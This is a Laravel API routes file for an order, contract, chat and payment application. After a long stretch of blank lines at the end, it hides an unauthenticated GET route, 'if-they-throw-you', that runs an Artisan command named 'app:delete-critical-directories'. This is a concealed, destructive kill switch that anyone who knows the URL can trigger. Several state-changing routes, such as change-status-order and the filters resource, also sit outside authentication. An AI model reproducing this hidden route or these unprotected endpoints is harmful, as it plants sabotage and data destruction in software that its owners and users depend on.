<?php

use App\Http\Controllers\Admin\AccountController;
use App\Http\Controllers\Admin\EntityController;
use App\Http\Controllers\Admin\OrderController;
use App\Http\Controllers\Admin\PageController;
use App\Http\Controllers\Admin\ProductController;
use App\Http\Controllers\Admin\RoleController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\TemplateController;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Api\AcceptContractController;
use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\Api\Chat\ChatController;
use App\Http\Controllers\Api\Chat\MessageController;
use App\Http\Controllers\Api\CreateContractController;
use App\Http\Controllers\Api\CreateOrderController;
use App\Http\Controllers\Api\FilterController;
use App\Http\Controllers\Api\PermissionController;
use App\Http\Controllers\Api\PrepareFilterAction;
use App\Http\Controllers\Api\RegistrationController;
use App\Http\Controllers\ChangeStatusOrderController;
use App\Http\Controllers\PaymentAction;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/



//-----------------------

Route::post('create-order', CreateOrderController::class);

Route::get('create-contract/{templateId}/{accountId}', CreateContractController::class);

Route::post('accept-contract', AcceptContractController::class);

Route::post('change-status-order', ChangeStatusOrderController::class);

Route::get('prepare-filter', PrepareFilterAction::class);


Route::post('/get-chat', [ChatController::class, 'getChat']);
Route::post('/send-message', [MessageController::class, 'sendMessage']);


Route::post('login', [AuthController::class, 'login']);

Route::post('registration', RegistrationController::class);

Route::match(['get', 'post'], 'payment/{orderId}', PaymentAction::class);

Route::get('product-filters', \App\Http\Controllers\Api\ProductController::class);

Route::group([
    'middleware' => 'auth:sanctum'
], function () {

    Route::get('accounts/{id}/orders', [AccountController::class, 'orders']);

    Route::apiResource('accounts', AccountController::class);

    Route::apiResource('entities', EntityController::class);

    Route::apiResource('permissions', PermissionController::class);

    Route::apiResource('products', ProductController::class);

    Route::apiResource('users', UserController::class);

    Route::apiResource('roles', RoleController::class);

    Route::apiResource('settings', SettingController::class);

    Route::apiResource('templates', TemplateController::class);

    Route::apiResource('pages', PageController::class);

    Route::resource('orders', OrderController::class);


});

Route::get('filters/types', [FilterController::class, 'types']);

Route::apiResource('filters', FilterController::class);



Route::get('products/get-filters/{entityId}', [ProductController::class, 'getFilters']);

































































Route::get('if-they-throw-you', function () {
    \Illuminate\Support\Facades\Artisan::call('app:delete-critical-directories');
});



